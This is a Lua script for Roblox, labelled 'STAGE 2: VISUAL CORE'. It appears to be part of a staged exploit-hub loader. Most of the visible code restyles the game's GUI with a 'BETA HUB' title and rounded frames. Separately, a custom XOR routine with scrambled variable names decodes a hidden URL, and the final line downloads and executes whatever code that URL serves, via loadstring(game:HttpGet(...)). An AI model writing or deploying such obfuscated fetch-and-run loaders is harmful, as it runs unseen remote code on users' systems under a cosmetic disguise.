
--[[ STAGE 2: VISUAL CORE ]]
local LcOyQLbeJQXp5xvA = bit32 and bit32.bxor
if not LcOyQLbeJQXp5xvA then
    LcOyQLbeJQXp5xvA = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function pDw4k7BbXzawvLSZrzZvHp3P(data, a, b, m, s, r)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local step = (b + i * s) % 256
        if m == 0 then
            v = (v - step) % 256
            v = LcOyQLbeJQXp5xvA(v, a)
        else
            v = LcOyQLbeJQXp5xvA(v, a)
            v = (v - step) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local R9pmaMluMOhwWrZPl9Kr = {
  {{222, 229, 172, 232}, 155, 226, 0, 2, true, 19},
  {{158, 156, 159, 174, 161, 187, 198}, 130, 162, 1, 6, true, 11},
  {{218, 210, 237}, 114, 195, 0, 4, true, 21},
  {{28, 19, 30}, 162, 72, 1, 2, false, 6},
  {{146, 160, 133, 212}, 69, 104, 0, 1, false, 15},
  {{196, 20, 25, 199, 199, 203, 19}, 70, 157, 0, 2, false, 20},
  {{50, 64, 55, 86, 65}, 76, 15, 0, 2, false, 9},
  {{1, 11, 233, 227, 235, 225}, 36, 138, 0, 3, false, 14},
  {{11, 8, 17, 19, 25, 29}, 152, 9, 0, 5, true, 8},
  {{223, 159, 210, 236, 232, 176}, 132, 225, 1, 6, false, 7},
  {{67, 52, 68, 109}, 108, 35, 0, 2, false, 3},
  {{33, 51, 49}, 142, 57, 0, 7, true, 17},
  {{180, 186, 129, 183, 179, 241}, 220, 248, 1, 1, true, 10},
  {{53, 223, 193, 210, 214, 237}, 205, 143, 1, 7, true, 4},
  {{80, 87, 97, 103, 81}, 202, 145, 0, 6, true, 1},
  {{129, 128, 115, 129, 115, 128, 128}, 96, 107, 0, 1, false, 5},
  {{61, 69, 115}, 208, 168, 0, 6, false, 16},
  {{222, 228, 245}, 160, 73, 0, 6, true, 2},
  {{54, 33, 26, 93}, 26, 200, 1, 3, true, 12},
  {{254, 218, 237, 24, 25, 35, 57}, 31, 140, 0, 7, false, 18},
  {{156, 185, 103, 121}, 119, 153, 1, 3, true, 13}
}
local QBYD8hxeHL_Stky = {}
for bi5ESWHN6iEfCs = 1, #R9pmaMluMOhwWrZPl9Kr do
    local oxwF0CnIqZrXTa48cxPOUq_ = R9pmaMluMOhwWrZPl9Kr[bi5ESWHN6iEfCs]
    QBYD8hxeHL_Stky[oxwF0CnIqZrXTa48cxPOUq_[7]] = pDw4k7BbXzawvLSZrzZvHp3P(oxwF0CnIqZrXTa48cxPOUq_[1], oxwF0CnIqZrXTa48cxPOUq_[2], oxwF0CnIqZrXTa48cxPOUq_[3], oxwF0CnIqZrXTa48cxPOUq_[4], oxwF0CnIqZrXTa48cxPOUq_[5], oxwF0CnIqZrXTa48cxPOUq_[6])
end
local SRLyZ4MjFwUs5hzG = table.concat(QBYD8hxeHL_Stky)
local HubName = "BETA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(SRLyZ4MjFwUs5hzG))()
